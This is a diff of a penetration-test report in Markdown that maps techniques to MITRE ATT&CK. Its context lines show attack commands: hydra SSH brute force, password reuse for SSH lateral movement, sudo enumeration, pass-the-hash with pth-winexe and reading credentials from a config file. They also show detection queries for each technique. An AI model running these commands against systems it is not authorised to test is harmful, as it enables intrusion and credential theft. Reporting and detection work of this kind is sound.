@@ -86,7 +86,6 @@ This engagement demonstrated multiple techniques from the MITRE ATT&CK Enterpris
 hydra -L userlist -P passlist ssh://web-server-01.internal.corp
 Success: svc_webapp:Summer2024!
 
-text
 
 ### T1021.004 - SSH Lateral Movement
 
@@ -96,7 +95,6 @@ text
 ssh jsmith@app-server-01.internal.corp
 Password: Welcome123! (reused from database)
 
-text
 
 ### T1548.003 - Sudo Privilege Escalation
 
@@ -106,7 +104,6 @@ text
 sudo -l
 (root) NOPASSWD: /opt/scripts/backup.sh
 
-text
 
 ### T1550.002 - Pass the Hash
 
@@ -115,7 +112,6 @@ text
 
 pth-winexe -U administrator//[hash] //dc-01.internal.corp cmd
 
-text
 
 ### T1552.001 - Unsecured Credentials
 
@@ -125,7 +121,6 @@ text
 cat /var/www/html/config/database.php
 db_user = 'app_dbuser', db_pass = 'DbAdmin123!'
 
-text
 
 ## 🛡️ Detection Recommendations
 
@@ -135,7 +130,6 @@ SIEM query for SSH brute force detection
 
 source="ssh_logs" failed password | stats count by src_ip | where count > 10
 
-text
 
 ### T1550.002 Detection - Pass-the-Hash
 
@@ -143,7 +137,6 @@ Windows Event ID for Pass-the-Hash detection
 
 Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624; LogonType=9}
 
-text
 
 ### T1021.004 Detection - SSH Lateral Movement
 
@@ -151,7 +144,6 @@ SSH lateral movement monitoring
 
 grep "Accepted password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c
 
-text
 
 ### T1552.001 Detection - Credential Exposure
 
@@ -159,7 +151,6 @@ File integrity monitoring for config files
 
 find /var/www -name "*.php" -exec grep -l "password|passwd|pwd" {} ;
 
-text
 
 ## 📈 Strategic Insights
 
